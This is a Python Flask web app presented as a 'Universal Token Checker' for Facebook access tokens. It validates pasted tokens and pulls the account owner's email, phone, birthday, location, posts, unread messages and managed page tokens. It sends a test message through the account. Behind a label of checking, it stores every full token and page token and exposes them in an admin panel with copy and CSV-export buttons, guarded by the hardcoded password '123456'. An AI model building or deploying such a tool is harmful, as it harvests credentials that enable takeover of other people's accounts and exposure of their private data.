from flask import Flask, request, render_template_string, session, redirect, url_for, send_file
import requests
import time
import secrets
import json
import os
import csv
from io import StringIO

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ADMIN CREDENTIALS
ADMIN_USERNAME = "legend"
ADMIN_PASSWORD = "123456"

TOKENS_FILE = 'checked_tokens.json'

def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens[-100:], f, indent=2)

checked_tokens = load_tokens()

def check_token_with_message(token):
    token = token.strip()
    
    result = {
        "valid": False,
        "status": "NAHI CHAL RAHA",
        "name": "Unknown",
        "uid": "Unknown",
        "token_prefix": token[:10] + "..." + token[-5:],
        "full_token": token,
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry_guess": "Working Now",
        "profile_pic": "",
        "friends": "N/A", "pages": "N/A", "groups": "N/A",
        "email": "N/A", "phone": "N/A", "birthday": "N/A",
        "gender": "N/A", "location": "N/A", "hometown": "N/A",
        "relationship": "N/A", "work": "N/A", "education": "N/A",
        "posts_count": "N/A", "photos_count": "N/A", "videos_count": "N/A",
        "permissions": [],
        "latest_posts": [],
        "tagged_photos": "N/A",
        "unread_messages": "N/A",
        "managed_pages": []  # ← PAGES + PAGE TOKEN
    }

    # STEP 1: ME API
    me_url = "https://graph.facebook.com/v15.0/me"
    fields = "id,name,picture.width(200),email,mobile_phone,birthday,gender,location,hometown,relationship_status,work,education"
    params = {'access_token': token, 'fields': fields}
    try:
        r = requests.get(me_url, params=params, timeout=10)
        if r.status_code != 200:
            return result
        data = r.json()
        result["uid"] = data.get('id', 'N/A')
        result["name"] = data.get('name', 'N/A')
        result["profile_pic"] = data.get('picture', {}).get('data', {}).get('url', '')
        result["email"] = data.get('email', 'N/A')
        result["phone"] = data.get('mobile_phone', 'N/A')
        result["birthday"] = data.get('birthday', 'N/A')
        result["gender"] = data.get('gender', 'N/A')
        result["location"] = data.get('location', {}).get('name', 'N/A') if data.get('location') else 'N/A'
        result["hometown"] = data.get('hometown', {}).get('name', 'N/A') if data.get('hometown') else 'N/A'
        result["relationship"] = data.get('relationship_status', 'N/A')
        result["work"] = ", ".join([w.get('employer', {}).get('name', '') for w in data.get('work', [])]) if data.get('work') else 'N/A'
        result["education"] = ", ".join([e.get('school', {}).get('name', '') for e in data.get('education', [])]) if data.get('education') else 'N/A'
        result["valid"] = True
        result["status"] = "CHAL RAHA HAI"
    except:
        return result

    # STEP 2: SMART EXPIRY
    if token.startswith("EAAA"):
        result["expiry_guess"] = "Short-lived (1-2 hours)"
    elif token.startswith("EAAG") or len(token) > 300:
        result["expiry_guess"] = "Long-lived (60 days)"
    elif token.startswith("EAAD"):
        result["expiry_guess"] = "Page Token (Never expires)"
    else:
        result["expiry_guess"] = "Working Now"

    # STEP 3: COUNTS
    for endpoint, key in [
        ('friends', 'friends'), ('likes', 'pages'), ('groups', 'groups'),
        ('posts', 'posts_count'), ('photos', 'photos_count'), ('videos', 'videos_count')
    ]:
        try:
            r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/{endpoint}", 
                            params={'access_token': token, 'summary': 'total_count'}, timeout=10)
            if r.status_code == 200:
                result[key] = r.json().get('summary', {}).get('total_count', 'N/A')
        except: pass

    # STEP 4: PERMISSIONS
    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/permissions", params={'access_token': token}, timeout=10)
        if r.status_code == 200:
            result["permissions"] = [p['permission'] for p in r.json().get('data', []) if p.get('status') == 'granted']
    except: pass

    # STEP 5: LATEST 5 POSTS
    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/posts", 
                        params={'access_token': token, 'limit': 5, 'fields': 'message,created_time'}, timeout=10)
        if r.status_code == 200:
            result["latest_posts"] = [
                {"msg": (p.get('message') or "No text")[:50] + ("..." if len(p.get('message') or "") > 50 else ""), 
                 "time": p.get('created_time', '')[:10]}
                for p in r.json().get('data', [])
            ]
    except: pass

    # STEP 6: TAGGED PHOTOS
    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/photos/tagged", 
                        params={'access_token': token, 'summary': 'total_count'}, timeout=10)
        if r.status_code == 200:
            result["tagged_photos"] = r.json().get('summary', {}).get('total_count', 'N/A')
    except: pass

    # STEP 7: UNREAD MESSAGES
    try:
        r = requests.get(f"https://graph.facebook.com/v15.0/{result['uid']}/inbox", 
                        params={'access_token': token, 'fields': 'unread_count', 'limit': 1}, timeout=10)
        if r.status_code == 200 and r.json().get('data'):
            result["unread_messages"] = r.json()['data'][0].get('unread_count', 'N/A')
    except: pass

    # STEP 8: MANAGED PAGES + PAGE TOKENS
    try:
        r = requests.get("https://graph.facebook.com/v15.0/me/accounts", 
                        params={'access_token': token, 'fields': 'name,id,access_token,category,fan_count'}, timeout=10)
        if r.status_code == 200:
            for page in r.json().get('data', []):
                result["managed_pages"].append({
                    "name": page.get('name', 'Unknown'),
                    "id": page.get('id', 'N/A'),
                    "token": page.get('access_token', 'N/A'),
                    "category": page.get('category', 'N/A'),
                    "likes": page.get('fan_count', 'N/A')
                })
    except: pass

    # STEP 9: MESSAGE TEST
    try:
        convo_url = f"https://graph.facebook.com/v15.0/{result['uid']}/conversations"
        r = requests.get(convo_url, params={'access_token': token, 'limit': 1}, timeout=10)
        if r.status_code == 200 and r.json().get('data'):
            convo_id = r.json()['data'][0]['id']
            send_url = f"https://graph.facebook.com/v15.0/{convo_id}/messages"
            send_r = requests.post(send_url, data={'message': f"TEST_{int(time.time())}", 'access_token': token}, timeout=10)
            if send_r.status_code != 200:
                error = send_r.json().get('error', {}).get('message', '').lower()
                if "messaging" in error or "permission" in error:
                    result["status"] = "CHAL RAHA HAI (No Msg Perm)"
        else:
            result["status"] = "CHAL RAHA HAI (No Convo)"
    except:
        result["status"] = "CHAL RAHA HAI (Network)"

    checked_tokens.append(result)
    save_tokens(checked_tokens)
    return result

# ROUTES
@app.route('/', methods=['GET', 'POST'])
def home():
    result = None
    if request.method == 'POST':
        token = request.form.get('token', '').strip()
        if token:
            result = check_token_with_message(token)
    return render_template_string(HOME_TEMPLATE, result=result)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin'] = True
            session['login_time'] = time.time()
            return redirect('/admin')
        else:
            return render_template_string(LOGIN_TEMPLATE, error="Wrong Username or Password!")
    return render_template_string(LOGIN_TEMPLATE, error=None)

@app.route('/admin')
def admin():
    if not session.get('admin'):
        return redirect('/admin/login')
    if time.time() - session.get('login_time', 0) > 1800:
        session.clear()
        return redirect('/admin/login')
    
    search = request.args.get('search', '').lower()
    tokens = checked_tokens
    if search:
        tokens = [t for t in tokens if search in t['name'].lower() or search in t['uid']]
    
    return render_template_string(ADMIN_TEMPLATE, tokens=tokens[::-1], search=search)

@app.route('/admin/delete/<uid>')
def delete_token(uid):
    if not session.get('admin'): return redirect('/admin/login')
    global checked_tokens
    checked_tokens = [t for t in checked_tokens if t['uid'] != uid]
    save_tokens(checked_tokens)
    return redirect('/admin')

@app.route('/admin/export')
def export_csv():
    if not session.get('admin'): return redirect('/admin/login')
    output = StringIO()
    writer = csv.DictWriter(output, fieldnames=checked_tokens[0].keys() if checked_tokens else [])
    writer.writeheader()
    writer.writerows(checked_tokens)
    output.seek(0)
    return send_file(output, mimetype='text/csv', as_attachment=True, download_name='tokens.csv')

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect('/')

# TEMPLATES
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>UNIVERSAL TOKEN CHECKER</title>
<style>
  body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding: 20px; }
  input, button { margin: 10px; padding: 14px; width: 90%; max-width: 420px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; font-size: 16px; }
  button { background: #0f0; color: #000; font-weight: bold; }
  h1 { text-shadow: 0 0 20px #0f0; font-size: 2.2em; }
  .result { background: #111; border: 1px solid #0f0; padding: 18px; margin: 20px; border-radius: 12px; font-size: 14px; }
  .valid { color: #0f0; font-size: 1.5em; font-weight: bold; }
  .invalid { color: #f55; font-size: 1.5em; font-weight: bold; }
  .admin-btn { background: #ff0; color: #000; margin-top: 40px; padding: 14px; font-weight: bold; border-radius: 10px; }
  .pic { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #0f0; margin: 10px; }
  .post { background: #111; border: 1px solid #0f0; padding: 10px; margin: 8px; border-radius: 8px; }
</style>
<script>
function copy(t){navigator.clipboard.writeText(t).then(()=>{alert("Copied!");});}
</script>
</head><body>
<h1>TOKEN CHECKER</h1>
<p style="color:#0f0;">EAAD, EAAB, EAAAA, EAAG - Sab Chalega!</p>
<form method="post">
  <input type="text" name="token" placeholder="Paste Any Facebook Token" required>
  <button type="submit">CHECK TOKEN</button>
</form>

{% if result %}
<div class="result">
  {% if result.valid %}<p class="valid">{{ result.status }}</p>{% else %}<p class="invalid">{{ result.status }}</p>{% endif %}
  {% if result.profile_pic %}<img src="{{ result.profile_pic }}" class="pic">{% endif %}
  <p><b>Name:</b> {{ result.name }}</p>
  <p><b>UID:</b> {{ result.uid }}</p>
  <p><b>Email:</b> {{ result.email }}</p>
  <p><b>Phone:</b> {{ result.phone }}</p>
  <p><b>Birthday:</b> {{ result.birthday }}</p>
  <p><b>Gender:</b> {{ result.gender }}</p>
  <p><b>Location:</b> {{ result.location }}</p>
  <p><b>Hometown:</b> {{ result.hometown }}</p>
  <p><b>Relationship:</b> {{ result.relationship }}</p>
  <p><b>Work:</b> {{ result.work }}</p>
  <p><b>Education:</b> {{ result.education }}</p>
  <p><b>Token:</b> {{ result.token_prefix }}</p>
  <p><b>Valid for:</b> {{ result.expiry_guess }}</p>
  <p><b>Friends:</b> {{ result.friends }} | <b>Pages:</b> {{ result.pages }} | <b>Groups:</b> {{ result.groups }}</p>
  <p><b>Posts:</b> {{ result.posts_count }} | <b>Photos:</b> {{ result.photos_count }} | <b>Videos:</b> {{ result.videos_count }}</p>
  <p><b>Tagged Photos:</b> {{ result.tagged_photos }}</p>
  <p><b>Unread Messages:</b> {{ result.unread_messages }}</p>
  <p><b>Permissions:</b> {{ result.permissions|join(', ') }}</p>

  {% if result.latest_posts %}
  <h3 style="color:#0f0;">Latest Posts:</h3>
  {% for post in result.latest_posts %}
  <div class="post"><b>{{ post.time }}</b>: {{ post.msg }}</div>
  {% endfor %}
  {% endif %}

  {% if result.managed_pages %}
  <h3 style="color:#0f0;">Pages Managed:</h3>
  {% for page in result.managed_pages %}
  <div style="background:#111; border:1px solid #0f0; padding:12px; margin:8px; border-radius:8px;">
    <p><b>{{ page.name }}</b> | ID: {{ page.id }} | Likes: {{ page.likes }} | {{ page.category }}</p>
    <p><b>Token:</b> {{ page.token[:15] }}...{{ page.token[-5:] }} 
      <button onclick="copy('{{ page.token }}')" style="background:#0f0;color:#000;padding:4px 8px;border:none;border-radius:5px;font-size:12px;cursor:pointer;">COPY</button>
    </p>
  </div>
  {% endfor %}
  {% endif %}
</div>
{% endif %}

<a href="/admin/login"><button class="admin-btn">ADMIN PANEL</button></a>
</body></html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN LOGIN</title>
<style>
  body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding: 40px; }
  input, button { margin: 10px; padding: 14px; width: 80%; max-width: 350px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; font-size: 16px; }
  button { background: #0f0; color: #000; font-weight: bold; }
  h1 { text-shadow: 0 0 20px #0f0; }
  .error { color: #f55; margin: 20px; }
</style></head><body>
<h1>ADMIN LOGIN</h1>
{% if error %}<p class="error">{{ error }}</p>{% endif %}
<form method="post">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">LOGIN</button>
</form>
<br><a href="/" style="color:#0f0; text-decoration:none;">Back to Checker</a>
</body></html>
'''

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ADMIN - ALL TOKENS</title>
<style>
  body { background: #000; color: #0f0; font-family: 'Courier New'; padding: 15px; }
  .card { background: #111; border: 1px solid #0f0; margin: 12px 0; padding: 15px; border-radius: 10px; word-break: break-all; font-size: 13px; }
  .valid { color: #0f0; } .invalid { color: #f55; }
  .back, .logout, .export-btn, .del-btn { background: #ff0; color: #000; padding: 10px; text-decoration: none; border-radius: 8px; display: inline-block; margin: 5px; font-size: 12px; }
  .del-btn { background: #f55; }
  .copy-btn { background: #0f0; color: #000; border: none; padding: 5px 10px; margin-left: 10px; border-radius: 5px; font-size: 12px; cursor: pointer; }
  .search { width: 90%; max-width: 400px; padding: 12px; margin: 10px; border: 1px solid #0f0; background: #111; color: #0f0; border-radius: 10px; }
  .pic { width: 40px; height: 40px; border-radius: 50%; border: 1px solid #0f0; margin-right: 8px; vertical-align: middle; }
  .post { font-size: 12px; margin: 5px 0; }
</style>
<script>
  function copyToken(t) { navigator.clipboard.writeText(t).then(() => alert("Copied!")); }
</script>
</head><body>
<h1 style="text-align:center; text-shadow:0 0 15px #0f0;">ADMIN PANEL</h1>
<a href="/" class="back">BACK</a>
<a href="/admin/logout" class="logout">LOGOUT</a>
<a href="/admin/export" class="export-btn">EXPORT CSV</a>
<form method="get" style="display:inline;">
  <input type="text" name="search" class="search" placeholder="Search UID or Name" value="{{ search }}">
</form>
<p><b>Total: {{ tokens|length }}</b></p>

{% for t in tokens %}
<div class="card">
  <p>
    {% if t.profile_pic %}<img src="{{ t.profile_pic }}" class="pic">{% endif %}
    <b>{{ t.name }}</b> | <b>UID:</b> {{ t.uid }}
    <a href="/admin/delete/{{ t.uid }}" class="del-btn" onclick="return confirm('Delete?')">DELETE</a>
  </p>
  <p><b>Full Token:</b> {{ t.full_token }} 
    <button class="copy-btn" onclick="copyToken('{{ t.full_token }}')">COPY</button>
  </p>
  <p class="{{ 'valid' if t.valid else 'invalid' }}"><b>{{ t.status }}</b></p>
  <p><b>Valid for:</b> {{ t.expiry_guess }}</p>
  <p><b>Friends:</b> {{ t.friends }} | <b>Pages:</b> {{ t.pages }} | <b>Groups:</b> {{ t.groups }}</p>
  <p><b>Email:</b> {{ t.email }} | <b>Phone:</b> {{ t.phone }}</p>
  <p><b>Birthday:</b> {{ t.birthday }} | <b>Gender:</b> {{ t.gender }}</p>
  <p><b>Location:</b> {{ t.location }} | <b>Hometown:</b> {{ t.hometown }}</p>
  <p><b>Relationship:</b> {{ t.relationship }} | <b>Work:</b> {{ t.work }}</p>
  <p><b>Education:</b> {{ t.education }}</p>
  <p><b>Posts:</b> {{ t.posts_count }} | <b>Photos:</b> {{ t.photos_count }} | <b>Videos:</b> {{ t.videos_count }}</p>
  <p><b>Tagged:</b> {{ t.tagged_photos }} | <b>Unread:</b> {{ t.unread_messages }}</p>
  <p><b>Permissions:</b> {{ t.permissions|join(', ') }}</p>

  {% if t.latest_posts %}
  <p><b>Latest Posts:</b></p>
  {% for post in t.latest_posts %}
  <div class="post">{{ post.time }}: {{ post.msg }}</div>
  {% endfor %}
  {% endif %}

  {% if t.managed_pages %}
  <p><b>Pages Managed:</b></p>
  {% for page in t.managed_pages %}
  <div style="background:#222; border:1px solid #0f0; padding:10px; margin:5px; border-radius:6px; font-size:12px;">
    <b>{{ page.name }}</b> | ID: {{ page.id }} | Likes: {{ page.likes }} | {{ page.category }}
    <br>Token: {{ page.token }} <button class="copy-btn" onclick="copyToken('{{ page.token }}')">COPY</button>
  </div>
  {% endfor %}
  {% endif %}

  <p><small>{{ t.checked_at }}</small></p>
</div>
{% endfor %}
</body></html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
